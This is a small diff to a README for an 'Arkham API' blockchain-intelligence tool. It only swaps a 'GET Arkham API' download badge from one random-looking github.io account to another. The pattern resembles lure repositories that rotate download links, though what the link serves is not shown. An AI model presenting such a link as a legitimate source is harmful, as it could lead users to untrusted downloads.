@@ -1,6 +1,6 @@
 # Arkham API - Blockchain Intelligence Developer Interface
 
-[![GET Arkham API](https://img.shields.io/badge/GET%20%E2%80%94%20Arkham%20API-0078D6?style=for-the-badge&logoColor=white)](https://juanhowardbrkq.github.io/.github/arkham-api)
+[![GET Arkham API](https://img.shields.io/badge/GET%20%E2%80%94%20Arkham%20API-0078D6?style=for-the-badge&logoColor=white)](https://leonidaskerrxrjg.github.io/.github/arkham-api)
 
 ## Overview of Arkham API
 
